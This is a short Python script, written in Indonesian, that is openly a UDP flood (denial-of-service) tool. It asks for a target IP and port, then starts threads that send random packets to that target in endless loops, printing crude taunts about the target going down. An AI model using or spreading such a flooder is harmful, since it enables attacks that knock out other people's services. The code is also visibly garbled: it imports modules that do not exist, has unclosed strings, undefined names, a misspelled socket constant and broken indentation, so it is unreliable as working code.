import os
import choice
import theards
import random
import times

 os.system("clear")
 print("""\033[070m
 
 
╔╗──────────────────
║║──────────────────
║╚═╗╔╗╔╗╔╗╔═══╗╔═══╗
║╔╗║─╣║╚╝║─══║║─══║║
║╚╝║║║║║║║║║══╣║║══╣
╚══╝╚╝╚╩╩╝╚═══╝╚═══╝
 
 
                         """)
print("""\033[090
ip = str(input(" MASUKKAN IP TARGET : "  ;))
port = int(input(" MASUKKAN PORT TARGET :  ;))
choice = str(input(" MASUKKAN UDP Y/N : "  ;))
theards = int(input(" MASUKKAN PAKETS : "  ;))
times = int(input(" MASUKKAN THEARDS : "  ;)
)


def bimzz():
    data = random._urandom(1024)
    i = random.choice(("[bimzz]","[bimzz]","[bimzz]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for z in range(time):
                s.sendto(data,addr)
            print(i +" [ Duar Memek! ] | Sedang Mengirim Packets Dari Bimzz..")
        except:
            print("[!] | Yah Down Yah? Awokwsaowkswosk |")

def bimzz2():
    data = random._urandom(16)
    i = random.choice(("[bimzz]","[bimzz]","[bimzz]"))
    while True:
        try:
            s = socket.socket(socket.AF_INIT, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for z in range(time):
                s.send(data)
            print(i +"| BimzzNihJanganSeremSeremBwang.. |")
        except:
            s.close()
            print("[*] | Yah Down Yah? Awokwsaowkswosk |")
            
 for a in range(threds):
    if choice == "y":
        th = threading.Thread(target = bimzz)
        th.start()
    else:
        th = threading.Thread(target = bimzz2)
        th.start